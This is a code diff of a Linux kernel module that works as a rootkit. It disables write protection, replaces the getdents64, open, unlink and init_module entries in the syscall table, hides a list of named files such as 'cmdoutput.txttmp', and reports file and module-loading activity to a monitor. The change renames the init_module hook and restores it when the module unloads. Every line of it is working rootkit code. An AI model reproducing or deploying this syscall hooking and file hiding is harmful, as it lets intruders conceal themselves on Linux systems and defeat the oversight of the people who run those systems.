@@ -22,14 +22,14 @@ static int configMonitor(char *msg);
 asmlinkage long (*kernel_getdents64)(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count);
 asmlinkage long (*kernel_open)(const char __user *filename, int flags, umode_t mode);
 asmlinkage long (*kernel_unlink)(const char __user *pathname);
-asmlinkage long (*kernel_sys_init_module)(void __user *  umod,  unsigned long len, 
+asmlinkage long (*kernel_init_module)(void __user *  umod,  unsigned long len, 
                                               const char __user * uargs);
 
 // Hooked system call
 asmlinkage long hooked_getdents64(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count);
 asmlinkage long hooked_open(const char __user *filename, int flags, umode_t mode);
 asmlinkage long hooked_unlink(const char __user *pathname);
-asmlinkage long hooked_sys_init_module(void __user *  umod,  unsigned long len, 
+asmlinkage long hooked_init_module(void __user *  umod,  unsigned long len, 
                                               const char __user * uargs);
 
 /*************** What file we gonna hide ********************/
@@ -40,7 +40,7 @@ char *monitor = NULL;
 int filenum;
 int moni_open;
 int moni_unlink;
-int moni_sys_init_module;
+int moni_init_module;
 
 /*
  * Disable write protection for hook system call table
@@ -58,11 +58,11 @@ static int lkm_init(void)
     kernel_getdents64 = (void *)syscall_table[__NR_getdents64]; 
     kernel_open = (void *)syscall_table[__NR_open]; 
     kernel_unlink = (void *)syscall_table[__NR_unlink]; 
-    kernel_sys_init_module = (void *)syscall_table[__NR_sys_init_module]; 
+    kernel_init_module = (void *)syscall_table[__NR_init_module]; 
     syscall_table[__NR_getdents64] = (unsigned long *)hooked_getdents64;
     syscall_table[__NR_open] = (unsigned long *)hooked_open;
     syscall_table[__NR_unlink] = (unsigned long *)hooked_unlink;
-    syscall_table[__NR_sys_init_module] = (unsigned long *)hooked_sys_init_module;
+    syscall_table[__NR_init_module] = (unsigned long *)hooked_init_module;
     ENABLE_WRITE_PROTECTION;
     
     hidfiles[0] = "cmdoutput.txttmp";
@@ -75,7 +75,7 @@ static int lkm_init(void)
     filenum=7;
     moni_open = 0;
     moni_unlink = 0;
-    moni_sys_init_module = 0;
+    moni_init_module = 0;
     
     return 0;    
 }
@@ -154,13 +154,13 @@ asmlinkage long hooked_open(const char __user *filename, int flags, umode_t mode
     return kernel_open(filename, flags, mode);
 }
 
-asmlinkage long hooked_sys_init_module(void __user *  umod,  unsigned long len, 
+asmlinkage long hooked_init_module(void __user *  umod,  unsigned long len, 
                                               const char __user * uargs){
-    if(moni_sys_init_module){
+    if(moni_init_module){
         callMonitor("sys_init_module", (char*) umod);
     }
     
-    return kernel_sys_init_module(umod, len, uargs);
+    return kernel_init_module(umod, len, uargs);
 }
 
 asmlinkage long hooked_unlink(const char __user *filename){
@@ -220,6 +220,7 @@ static void lkm_exit(void)
     syscall_table[__NR_getdents64] = (unsigned long *)kernel_getdents64;
     syscall_table[__NR_open] = (unsigned long *)kernel_open;
     syscall_table[__NR_unlink] = (unsigned long *)kernel_unlink;
+    syscall_table[__NR_init_module] = (unsigned long *)kernel_init_module;
     ENABLE_WRITE_PROTECTION;
 }
 
